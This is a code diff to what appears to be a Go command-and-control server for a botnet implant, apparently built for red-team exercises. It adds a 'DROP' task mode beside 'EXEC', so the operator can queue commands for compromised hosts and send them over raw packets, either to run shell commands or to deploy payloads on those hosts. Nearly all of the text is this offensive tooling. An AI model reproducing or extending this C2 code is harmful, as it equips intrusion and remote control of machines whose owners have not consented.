@@ -33,6 +33,7 @@ var targetIP string
 type Task struct {
 	Target string
 	cmd    string
+	mode   string
 }
 
 type HostStat struct {
@@ -76,19 +77,28 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		// Make a socket for sending
 		fd := rawsocket.NewSocket()
 
+		// Create Packet
+		var packet []byte
+
 		/*Check if Packet needs to be sent */
 		queueLen := len(cmdQueue)
 		for i := 0; i < queueLen; i++ {
 			if cmdQueue[i].Target == bot.IP.String() {
 				/* Remove Element from Queue */
 				cmdCurr := cmdQueue[i].cmd
+				cmdType := cmdQueue[i].mode
 				cmdQueue = append(cmdQueue[:i], cmdQueue[i+1:]...)
 				queueLen--
 
-				/* Send Command */
-				packet := rawsocket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, rawsocket.CreateCommand(cmdCurr))
+				if cmdType == "EXEC" {
+					packet = rawsocket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, rawsocket.CreateCommand(cmdCurr))
+
+				} else if cmdType == "DROP" {
+					packet = rawsocket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, rawsocket.CreateDeploy(cmdCurr))
+				}
+
 				rawsocket.SendPacket(fd, iface, rawsocket.CreateAddrStruct(iface), packet)
-				fmt.Println("[+] Executed Task:", bot.Hostname, "(", bot.IP, ")")
+				fmt.Println("[+] Sent DROP :", bot.Hostname, "(", bot.IP, ")")
 				unix.Close(fd)
 				// updatepwnboard
 			}
@@ -149,8 +159,8 @@ func cli() {
 		case "exec":
 			if targetIP != "" {
 				cmd := tmpCmd[5:]
-				cmdQueue = append(cmdQueue, Task{targetIP, cmd})
-				fmt.Printf("[+] Queued : %v\n", cmd)
+				cmdQueue = append(cmdQueue, Task{targetIP, cmd, "EXEC"})
+				fmt.Printf("[+] Queued EXEC : %v\n", cmd)
 			} else {
 				fmt.Println("\x1b[31m[-] No Target\x1b[0m")
 			}
@@ -167,7 +177,11 @@ func cli() {
 		case "list":
 			cliList(splitCmd)
 		case "drop":
-			// send command but specific to the implant not COMMAND but DROP
+			if cmdArgc >= 3 {
+				cmd := tmpCmd[5:]
+				cmdQueue = append(cmdQueue, Task{targetIP, cmd, "DROP"})
+				fmt.Printf("[+] Queued DROP : %v\n", cmd)
+			}
 		case "queue":
 			for i := 0; i < len(cmdQueue); i++ {
 				fmt.Printf("%v : %v\n", cmdQueue[i].Target, cmdQueue[i].cmd)
@@ -185,7 +199,7 @@ func processPacket(packet gopacket.Packet, listen chan Host) {
 	data := string(packet.ApplicationLayer().Payload())
 	payload := strings.Split(data, " ")
 
-	fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
+	// fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
 
 	// Parse the values from the data
 	mac, err := net.ParseMAC(payload[2])
@@ -226,7 +240,6 @@ func main() {
 	// Zoi Time
 	banner()
 
-	/* rawsocket init */
 	// Create a BPF vm for filtering
 	vm := rawsocket.CreateBPFVM(rawsocket.FilterRaw)
 
@@ -250,10 +263,8 @@ func main() {
 	fmt.Println("[+] Starting go routine...")
 	go sendCommand(iface, myIP, dstMAC, listen)
 
-	// Start CLI
 	go cli()
 
-	// This needs to be on main thread
 	for {
 		packet := rawsocket.ServerReadPacket(readfd, vm)
 		// Pass Packet to process function
